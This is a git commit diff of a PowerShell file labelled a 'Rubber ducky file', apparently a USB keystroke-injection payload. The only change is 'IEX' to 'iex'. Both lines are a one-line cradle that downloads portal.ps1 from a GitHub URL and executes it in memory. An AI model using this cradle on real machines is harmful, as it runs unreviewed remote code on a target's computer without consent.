5e34e8cc6fdf33e553be858b57ba1394ea063b6f
Justin Perdok <justin-p@users.noreply.github.com>
2019-12-16 17:17:03 +0100

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -1,2 +1,2 @@
 # Rubber ducky file.
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/justin-p/PowerShell/master/portal.ps1')
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/justin-p/PowerShell/master/portal.ps1')
